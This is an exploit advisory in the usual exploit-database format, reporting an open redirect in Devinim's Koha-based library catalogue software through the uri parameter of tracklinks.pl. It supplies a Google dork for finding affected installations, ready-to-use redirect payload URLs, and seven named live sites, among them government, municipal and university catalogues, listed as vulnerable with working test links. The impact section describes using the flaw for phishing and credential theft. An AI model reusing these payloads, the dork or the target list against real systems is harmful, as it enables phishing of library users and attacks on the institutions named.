####################################################################

# Exploit Title : Devinim Library Software 19.0504000 Open Redirection Vulnerability
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 04/10/2019
# Vendor Homepage : devinim.com.tr
# Software Affected Versions and Download Links : 
Koha 16.1104000
download.koha-community.org/old_releases/koha-16.11.04.tar.gz
Koha 18.0503000
download.koha-community.org/old_releases/koha-18.05.03.tar.gz
Koha 18.0504000
download.koha-community.org/old_releases/koha-18.05.04.tar.gz
Koha 19.0504000
download.koha-community.org/koha-19.05.04.tar.gz
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Google Dorks : intext:Bu yazýlým Devinim Yazýlým Eðitim Danýþmanlýk tarafýndan geliþtirilip kurulmuþtur.
# Vulnerability Type : CWE-601 [ URL Redirection to Untrusted Site ('Open Redirect') ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

####################################################################

# Impact :
***********
Devinim Software accepts a user-controlled input that specifies
a link to an external site, and uses that link in a Redirect. This simplifies phishing 
attacks. An http parameter may contain a URL value and could cause the web 
application to redirect the request to the specified URL. By modifying the URL 
value to a malicious site, an attacker may successfully launch a phishing scam and 
steal user credentials. Because the server name in the modified link is identical to the 
original site, phishing attempts have a more trustworthy appearance. Open redirect is a 
failure in that process that makes it possible for attackers to steer users to malicious 
websites. This vulnerability is used in phishing attacks to get users to visit malicious 
sites without realizing it. Web users often encounter redirection when they visit the 
Web site of a company whose name has been changed or which has been acquired by 
another company. Visiting unreal web page user's computer becomes affected 
by malware the task of which is to deceive the valid actor and steal his personal data.

####################################################################

# Vulnerable File :
*****************
/tracklinks.pl

# Vulnerable Parameters :
***********************
?uri=//

?biblionumber=[ID-NUMBER]&uri=//

# Open Redirection Exploit :
**************************
/cgi-bin/koha/tracklinks.pl?uri=//[REDIRECT-ADDRESS-HERE].gov

/cgi-bin/koha/tracklinks.pl?biblionumber=[ID-NUMBER]&uri=//[REDIRECT-ADDRESS-HERE].gov

####################################################################

# Example Vulnerable Sites :
*************************
[+] koha.devinim.com.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] imrenahmettuzunkutuphanesi.org/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] ekatalog.nevsehir.edu.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] katalogtarama.cekulvakfi.org.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] boratavkutuphane.kulturturizm.gov.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] koha.gidatarim.edu.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

[+] kutuphane.pendik.bel.tr/cgi-bin/koha/tracklinks.pl?uri=//cxsecurity.com

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
